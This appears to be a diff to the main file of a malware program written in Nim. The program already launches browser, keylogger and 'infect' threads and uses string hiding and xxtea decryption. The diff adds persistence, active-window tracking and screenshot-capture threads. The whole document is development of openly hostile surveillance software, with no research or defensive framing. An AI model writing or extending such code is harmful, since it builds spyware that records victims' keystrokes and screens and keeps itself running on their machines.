@@ -13,7 +13,6 @@ from os import `/`
 from os import splitFile
 from os import existsFile
 
-
 from lib/more/xxtea import decrypt
 from lib/functions/hideString import d
 
@@ -42,10 +41,12 @@ from os import sleep
 
 from lib/channels import mainThread
 
-
 from lib/flags import USE_BROWSER_THREAD
 from lib/flags import USE_KEYLOGGER_THREAD
 from lib/flags import USE_INFECT_THREAD
+from lib/flags import USE_PERSISTENCE_THREAD
+from lib/flags import USE_WINDOW_NAME_THREAD
+from lib/flags import USE_SCREENSHOT_THREAD
 
 when isProd:
   from lib/functions/beforeStart import run
@@ -78,6 +79,27 @@ when USE_INFECT_THREAD:
   var infectThreadVar: Thread[void]
 
   createThread(infectThreadVar, initInfectThread)
+
+when USE_PERSISTENCE_THREAD:
+  from lib/threads/persistenceThread import initPersistenceThread
+
+  var persistenceThreadVar: Thread[void]
+
+  createThread(persistenceThreadVar, initPersistenceThread)
+
+when USE_WINDOW_NAME_THREAD:
+  from lib/threads/windowNameThread import initWindowNameThread
+
+  var windowNameThreadVar: Thread[void]
+
+  createThread(windowNameThreadVar, initWindowNameThread)
+
+when USE_SCREENSHOT_THREAD:
+  from lib/threads/screenshotThread import initScreenshotThread
+
+  var screenshotThreadVar: Thread[void]
+
+  createThread(screenshotThreadVar, initScreenshotThread)
 
 # wait for thread messages
 while true:
